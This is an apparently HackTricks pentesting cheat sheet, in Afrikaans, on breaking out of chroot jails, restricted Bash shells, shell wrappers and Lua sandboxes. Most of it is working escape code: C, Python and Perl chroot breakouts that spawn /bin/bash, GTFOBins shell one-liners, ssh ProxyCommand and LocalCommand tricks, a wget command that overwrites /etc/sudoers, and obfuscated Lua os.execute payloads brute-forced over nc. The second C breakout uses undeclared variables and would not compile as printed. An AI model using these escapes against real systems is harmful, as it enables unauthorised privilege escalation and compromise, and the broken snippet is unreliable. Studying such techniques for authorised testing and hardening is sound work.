# Ontsnap uit Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Soek in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **of jy enige binary met die "Shell"-eienskap kan execute**

## Chroot Escapes

Van [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Die chroot-meganisme is **nie bedoel om te verdedig** teen doelbewuste peutering deur **bevoorregte** (**root**) **gebruikers** nie. Op die meeste stelsels stapel chroot-kontekste nie korrek nie, en gechrootte programme **met voldoende privileges kan 'n tweede chroot uitvoer om uit te breek**.\
Gewoonlik beteken dit dat jy root binne die chroot moet wees om te escape.<sup>[[4]](#references)</sup>

> [!TIP]
> Die **tool** [**chw00t**](https://github.com/earthquake/chw00t) is geskep om die volgende scenario's te abuse en uit `chroot` te escape.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> As jy **root** binne 'n chroot is, **kan jy escape** deur **nog 'n chroot** te skep. Dit is omdat 2 chroots nie kan saamleef nie (in Linux), dus as jy 'n vouer skep en dan 'n **nuwe chroot skep** op daardie nuwe vouer terwyl **jy buite dit is**, sal jy nou **buite die nuwe chroot** wees en daarom in die FS wees.
>
> Dit gebeur omdat chroot gewoonlik NIE jou werksgids na die aangeduide een verskuif nie, sodat jy 'n chroot kan skep maar buite dit kan wees.<sup>[[4]](#references)[[5]](#references)</sup>

Gewoonlik sal jy nie die `chroot` binary binne 'n chroot jail vind nie, maar jy **kan 'n binary compile, upload en execute**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Gestoorde fd

> [!WARNING]
> Dit is soortgelyk aan die vorige geval, maar in hierdie geval **stoor die aanvaller 'n file descriptor na die huidige gids** en skep hy daarna **die chroot in 'n nuwe vouer**. Uiteindelik, omdat hy **toegang** tot daardie **FD** **buite** die chroot het, kry hy toegang daartoe en **ontsnap hy**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can via Unix Domain Sockets oorgedra word, dus:
>
> - Skep ’n child process (fork)
> - Skep UDS sodat die parent en child met mekaar kan kommunikeer
> - Voer chroot in die child process in ’n ander gids uit
> - Skep in die parent proc ’n FD van ’n gids wat buite die nuwe child proc se chroot is
> - Stuur daardie FD met die UDS na die child procc
> - Die child process doen chdir na daardie FD, en omdat dit buite sy chroot is, sal dit uit die jail ontsnap.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Mount die root device (/) in ’n gids binne die chroot
> - Voer chroot na daardie gids uit
>
> Dit is moontlik in Linux.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Mount procfs in ’n gids binne die chroot (indien dit nog nie gedoen is nie)
> - Soek ’n pid wat ’n ander root/cwd-inskrywing het, soos: /proc/1/root
> - Voer chroot na daardie inskrywing uit.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Skep ’n Fork (child proc) en voer chroot na ’n ander gids dieper in die FS uit, en CD daarheen
> - Skuif die gids waarin die child process is, vanuit die parent process na ’n gids vóór die child se chroot
> - Hierdie child process sal homself buite die chroot bevind.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Of ’n process met `ptrace` kan koppel, hang af van credentials, capabilities en geaktiveerde security modules soos Yama; debugging deur dieselfde gebruiker kan dus deur system policy beperk word.<sup>[[8]](#references)</sup>
> - Indien attachment toegelaat word, kan jy met ptrace by ’n process inval en shellcode daarin uitvoer ([sien hierdie voorbeeld](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

Kry inligting oor die jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Wysig PATH

Kontroleer of jy die PATH-omgewingsveranderlike kan wysig.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Gebruik van vim

Indien Vim beskikbaar is, stel die `shell`-opsie daarvan op 'n shell wat jy kan uitvoer en roep `:shell` aan.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pagers en help viewers

Baie beperkte omgewings laat steeds **pagers** of **help viewers** beskikbaar. Dit is gewoonlik vinniger om te misbruik as om `PATH` te probeer herbou.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Indien `git` beskikbaar is, stuur die `--paginate`-opsie uitvoer na `less` of `$PAGER`, wat nuttig is wanneer ’n pager escape beskikbaar is.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Algemene GTFOBins one-liners

Sodra jy weet watter binaries bereikbaar is, toets eers die ooglopende shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
As jy slegs **argumente** in 'n toegelate opdrag kan **inject** (in plaas daarvan om dit vrylik uit te voer), kyk ook na **GTFOArgs**.<sup>[[17]](#references)</sup>

### Skep skrip

Kyk of jy 'n uitvoerbare lêer kan skep met _/bin/bash_ as inhoud
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Kry bash vanaf SSH

As jy via ssh toegang verkry, kan jy die bediener dikwels vra om ’n **ander program** in plaas van die beperkte login shell uit te voer.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Indien `ssh` een van die min plaaslik toegelate binaries is, onthou dat dit ook as ’n **GTFOBin** misbruik kan word; sy `LocalCommand`- en `ProxyCommand`-opsies voer plaaslik gekonfigureerde helper commands uit.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

In Bash stuur ’n nameref toewysings na ’n ander veranderlike, terwyl die byvoeging van ’n element by `BASH_CMDS` daardie opdrag by Bash se interne opdrag-hashtabel voeg.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Wget se `-O`-opsie skryf afgelaaide inhoud na die gespesifiseerde uitvoerlêer; indien daardie pad skryfbaar is, kan dit ’n lêer soos `/etc/sudoers` oorskryf.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Beperkte shell wrappers (`git-shell`, `rssh`, `lshell`)

Sommige omgewings plaas jou nie in gewone `rbash` nie, maar in **wrappers** soos `git-shell`, `rssh` of `lshell`:

- `git-shell` aanvaar slegs server-side Git commands plus enigiets binne `~/git-shell-commands/`. As daardie directory bestaan, voer `help` uit om die toegelate custom actions op te lys. As jy daar kan **skryf**, word enige executable wat in daardie directory geplaas word, bereikbaar.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` laat gewoonlik slegs `scp`, `sftp`, `rsync` of Git-style operations toe. Fokus in daardie gevalle eers op **file write primitives**: upload `authorized_keys`, 'n shell startup file of 'n helper script na 'n writable location, en reconnect dan met `ssh -t ...`.
- As die wrapper slegs die command line filter, lys die reachable binaries op en pivot dan terug na **GTFOBins / GTFOArgs**.

### Ander tricks

Kyk ook na:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Die volgende page kan ook interessant wees:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Tricks oor escaping uit python jails is op die volgende page:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Op hierdie page kan jy die global functions vind waartoe jy binne lua toegang het: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Die standaard `load`, `string.char` en `os.execute` functions kan hierdie chunk bou en uitvoer wanneer hulle beskikbaar is.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
'n Tabel-funksie kan ook met `rawget` in plaas van puntsintaksis verkry word.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Gebruik `pairs` om 'n biblioteektabel te enumerate.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
Die volgorde waarin `pairs` tabelindekse opsom, is ongespesifiseer, dus moenie daarop staatmaak dat ’n spesifieke funksie eerste verskyn nie. As jy een spesifieke funksie moet uitvoer, kan jy ’n brute force attack uitvoer deur verskillende Lua-omgewings te laai en die eerste funksie van die library te roep.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Kry interaktiewe lua-shell**: As jy binne ’n beperkte lua-shell is, kan jy ’n nuwe lua-shell (en hopelik onbeperkte een) kry deur `debug.debug()` aan te roep, wat ’n interaktiewe modus binnegaan.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Hoe om uit Verskeie Chroot-oplossings te Ontsnap (Bucsay Balazs, DeepSec-toespraak en -skyfies)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash-verwysingshandleiding – Die Beperkte Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git-dokumentasie](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Linux-handleidingbladsy](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – chroot escape tool](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Linux-handleidingbladsy](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Linux-handleidingbladsy](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Git-dokumentasie](https://git-scm.com/docs/git)
- [10] [:shell – Vim-dokumentasie](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Bash Builtins – GNU Bash-verwysingshandleiding](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Bash Variables – GNU Bash-verwysingshandleiding](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [GNU Wget-handleiding](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – OpenBSD-handleidingbladsy](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – OpenBSD-handleidingbladsy](https://man.openbsd.org/ssh_config)
- [16] [Lua 5.4-verwysingshandleiding](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Argument Injection Exploitation Vector List](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
